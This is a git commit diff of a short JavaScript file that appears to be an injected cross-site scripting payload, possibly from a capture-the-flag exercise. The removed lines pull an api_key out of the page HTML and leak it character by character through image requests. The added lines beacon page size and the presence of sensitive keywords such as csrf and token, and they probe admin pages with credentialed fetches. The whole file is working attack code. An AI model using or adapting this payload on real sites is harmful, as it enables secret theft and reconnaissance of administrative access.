34bf6176006bd472c1652d1df9404bb68da68d11
daveakd06 <dev-benin@epitech.africa>
2026-08-31 20:04:38 +0200

    d3

--- p.js
+++ p.js
@@ -1,13 +1,12 @@
 (function(){
- var b='/cases.php/'; var img=function(s){new Image().src=b+s+'.css';};
+ var R='R9478'; var b='/cases.php/'; var img=function(s){new Image().src=b+R+'_'+s+'.css';};
  try{
-  img('PLRAN_2');
-  var H=document.documentElement.outerHTML;
-  img('D_HLEN_'+H.length);
-  var mk=H.match(/api_key[=:"'\s]+([A-Za-z0-9_\-]{6,})/);
-  if(mk){var k=mk[1]; img('D_KLEN_'+k.length); for(var i=0;i<k.length;i++) img('D_K_'+i+'_'+k.charCodeAt(i));}
-  ['publish','seize','homepage','banner','upload','overwrite','index.html','notice','HLB2026','action=','apikey','api_key','csrf','token'].forEach(function(w,idx){ if(H.indexOf(w)>=0) img('D_HAS_'+idx); });
-  var f=document.querySelector('form'); if(f){var a=(f.getAttribute('action')||'SELF'); img('D_FLEN_'+a.length); for(var j=0;j<a.length;j++) img('D_F_'+j+'_'+a.charCodeAt(j));}
-  fetch('/admin/index.php',{credentials:'include'}).then(function(r){img('D_ADMSTAT_'+r.status);}).catch(function(){img('D_ADMFETCHERR');});
- }catch(e){ img('D_ERR'); }
+  img('RAN');
+  var H=(document.documentElement&&document.documentElement.outerHTML)||'';
+  img('HOK_'+(H.length>0?1:0));
+  var L=''+H.length; for(var d=0;d<L.length;d++) img('HL'+d+'_'+L.charAt(d));
+  var kws=['action','<form','publish','seize','homepage','banner','upload','overwrite','notice','HLB2026','api_key','apikey','token','csrf','<button','/admin','textarea','contenteditable'];
+  kws.forEach(function(w,i){ if(H.indexOf(w)>=0) img('HAS'+i); });
+  ['/admin/index.php','/admin/review.php','/admin/search.php'].forEach(function(u,i){ fetch(u,{credentials:'include'}).then(function(r){img('AF'+i+'s'+r.status);}).catch(function(){img('AF'+i+'ERR');}); });
+ }catch(e){ img('ERR'); }
 })();
